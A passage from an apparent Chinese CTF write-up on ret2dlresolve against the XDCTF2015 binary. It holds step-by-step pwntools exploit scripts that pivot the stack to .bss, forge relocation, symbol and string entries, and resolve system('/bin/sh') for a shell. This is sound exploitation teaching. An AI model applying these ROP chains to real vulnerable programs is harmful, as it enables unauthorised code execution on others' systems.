class="line">success(<span class="string">"fake_rel_plt_addr: "</span> + hex(fake_rel_plt_addr))</span><br><span class="line">success(<span class="string">"fake_dynsym_addr: "</span> + hex(fake_dynsym_addr))</span><br><span class="line">success(<span class="string">"fake_dynstr_addr: "</span> + hex(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">"n: "</span> + hex(n))</span><br><span class="line">success(<span class="string">"r_info: "</span> + hex(r_info))</span><br><span class="line">success(<span class="string">"offset: "</span> + hex(str_offset))</span><br><span class="line">success(<span class="string">"system_addr: "</span> + hex(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">"bss_addr: "</span> + hex(elf.bss()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>**</p>
+<h2 id="wiki-思路"><a href="#wiki-思路" class="headerlink" title="wiki 思路"></a>wiki 思路</h2><p>首先正常的获取占空间的大小：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582615353891-d276342c-2e2f-47ec-8c45-467ca8e4b889.png#align=left&display=inline&height=251&margin=%5Bobject%20Object%5D&name=image.png&originHeight=356&originWidth=722&size=88777&status=done&style=none&width=509" alt="image.png"></p>
+<p><strong>1</strong><br>介绍一种栈迁移的方法，把栈迁移到  bss  段来控制执行  write 函数，主要分两步：<br>1、栈迁移到  bss 段<br>2、控制  write  函数输出相应的字符串</p>
+<p>栈迁移的基本思路是用 leave；ret；<br>leave 相当于：<br><strong>mov esp,ebp</strong><br><strong>pop ebp</strong><br>ret 相当于：<br><strong>pop eip</strong></p>
+<p>使用  pwntools  的 ROP  模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)<span class="comment">#首先创建一个ROP对象</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)<span class="comment">#在ROP链中填充offset个a</span></span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)<span class="comment">#简易的调用read函数，相当于rop.call('read',[0,base_stage,100])</span></span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line"><span class="comment">#rop.migrate(base_stage)会将程序流程又转到base_stage</span></span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"><span class="comment">## write cmd="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line">rop.write(<span class="number">1</span>, base_stage + <span class="number">80</span>, len(sh))</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line"></span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>2</strong><br>接下来，用  dlresolve  的知识来调用  write  函数，利用  plt[0]  的相关指令，即公共 plt 表项 push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移<br>即  write@plt push 的那个参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"><span class="comment">## write cmd="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="comment">############## step 2 #################</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr<span class="comment">#会把找到的plt[0]的地址十进制形式给plt0</span></span><br><span class="line">write_index = (elf.plt[<span class="string">'write'</span>] - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">write_index *= <span class="number">8</span><span class="comment">#得到push的那一个write@plt的0x20也就是32</span></span><br><span class="line">rop.raw(plt0)<span class="comment">#common@plt的地址，会去执行那个common@plt的指令，先push一个</span></span><br><span class="line">rop.raw(write_index)<span class="comment">#write@plt</span></span><br><span class="line"><span class="comment">## fake ret addr of write</span></span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>对于通过  read  写入的那一串，首先会返回到  plt0  去执行公共 plt 表项的指令，此时因为我们没有执行之前的，所以把之前就应该  push  的那个 write_index，也就是 0x20  通过 raw()  写在栈里面</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583483025918-a46d8d81-495f-4973-a0f1-b7b43d32e0d3.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=518&originWidth=745&size=115844&status=done&style=none&width=591" alt="image.png"><br>拿上面原理的例子，如果是 write  的话，黄框圈出来的应该是 0x20</p>
+<p><strong>3</strong><br>同样控制 dl_resolve 函数中的 reloc_index 参数，不过这次控制其指向我们伪造的 write 重定位项</p>
+<p><code>readelf -r main</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582879229884-6ba4199f-99d3-4b39-8956-4e71d93c6916.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=271&originWidth=688&size=85423&status=done&style=none&width=592" alt="image.png"></p>
+<p>可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"><span class="comment">## write sh="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line"><span class="comment">## making base_stage+24 --&gt; fake reloc</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line"><span class="comment">#本来应该是0x20的,因为我们想要找的rel指针实际上是在 rel.plt+reloc_arg</span></span><br><span class="line"><span class="comment">#当rel.plt+index_offset的时候得到的就是base_stage</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>] <span class="comment"># Elf32_rel -&gt; r_offset</span></span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># write: Elf32_Rel -&gt; r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)<span class="comment">#会从跳转到我们的 Fake_reloc</span></span><br><span class="line"><span class="comment">## fake ret addr of write</span></span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(fake_reloc) <span class="comment">#Fake_reloc</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>4</strong><br>3 中，我们控制了重定位表项，但是重定位表项的内容与 write 原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。</p>
+<p>首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607&gt;&gt;8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582879734521-589a61e7-9519-4238-bb76-b011ef2fb275.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&name=image.png&originHeight=267&originWidth=687&size=43355&status=done&style=none&width=555" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"><span class="comment">## write sh="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"><span class="comment">### making fake write symbol</span></span><br><span class="line">fake_dynsym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_dynsym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_dynsym_addr = fake_dynsym_addr + align <span class="comment"># 用来对齐的</span></span><br><span class="line">index_dynsym = (fake_dynsym_addr - dynsym) / <span class="number">0x10</span>  <span class="comment"># 得到write的dynsym索引号</span></span><br><span class="line">fake_dynsym = flat([<span class="number">0x4c</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>]) <span class="comment"># 这就是fake_dynsym，0x4c就是那个name_offset</span></span><br><span class="line"><span class="comment">### making fake write relocation</span></span><br><span class="line"><span class="comment">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#计算 r_info,|7相当于加7,后面添加上07标识,表示这个是导入函数</span></span><br><span class="line">fake_reloc = flat([write_got, r_info])</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line"><span class="comment">## fake ret addr of write</span></span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(fake_reloc)  <span class="comment"># fake reloc</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * align)  <span class="comment"># padding</span></span><br><span class="line">rop.raw(fake_dynsym)  <span class="comment"># fake dynsym</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583737354702-8a760dfb-4add-4db9-b3b9-423b48a9b707.png#align=left&display=inline&height=634&margin=%5Bobject%20Object%5D&name=image.png&originHeight=869&originWidth=1022&size=133048&status=done&style=none&width=746" alt="image.png"><br><a href="https://xz.aliyun.com/t/5122" target="_blank" rel="noopener">https://xz.aliyun.com/t/5122</a></p>
+<p><strong>5</strong><br>我们进一步使得 write 符号的 name_offset 指向我们自己构造的字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"><span class="comment">## write sh="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"><span class="comment">### making fake write symbol</span></span><br><span class="line">fake_dynsym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_dynsym_addr - dynsym) &amp; <span class="number">0xf</span>)  <span class="comment"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class="line">fake_dynsym_addr = fake_dynsym_addr + align</span><br><span class="line">index_dynsym = (fake_dynsym_addr - dynsym) / <span class="number">0x10</span>  <span class="comment"># calculate the dynsym index of write</span></span><br><span class="line"><span class="comment">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class="line">name_offset = fake_dynsym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_dynsym = flat([name_offset, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"><span class="comment">### making fake write relocation</span></span><br><span class="line"><span class="comment">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_write_reloc = flat([write_got, r_info])</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line"><span class="comment">## fake ret addr of write</span></span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(fake_write_reloc)  <span class="comment"># fake write reloc</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * align)  <span class="comment"># padding</span></span><br><span class="line">rop.raw(fake_dynsym)  <span class="comment"># fake write symbol</span></span><br><span class="line">rop.raw(<span class="string">'write\x00'</span>)  <span class="comment"># there must be a \x00 to mark the end of string</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>6</strong><br>我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为，dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"><span class="comment">## write sh="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"><span class="comment">### making fake write symbol</span></span><br><span class="line">fake_dynsym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_dynsym_addr - dynsym) &amp; <span class="number">0xf</span>)  <span class="comment"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class="line">fake_dynsym_addr = fake_dynsym_addr + align</span><br><span class="line">index_dynsym = (fake_dynsym_addr - dynsym) / <span class="number">0x10</span>  <span class="comment"># calculate the dynsym index of write</span></span><br><span class="line"><span class="comment">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class="line">name_offset = fake_dynsym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_dynsym = flat([name_offset, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"><span class="comment">### making fake write relocation</span></span><br><span class="line"><span class="comment">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_write_reloc = flat([write_got, r_info])</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line"><span class="comment">## fake ret addr of write</span></span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">82</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(fake_write_reloc)  <span class="comment"># fake write reloc</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * align)  <span class="comment"># padding</span></span><br><span class="line">rop.raw(fake_dynsym)  <span class="comment"># fake write symbol</span></span><br><span class="line">rop.raw(<span class="string">'system\x00'</span>)  <span class="comment"># there must be a \x00 to mark the end of string</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line"><span class="keyword">print</span> rop.dump()</span><br><span class="line"><span class="keyword">print</span> 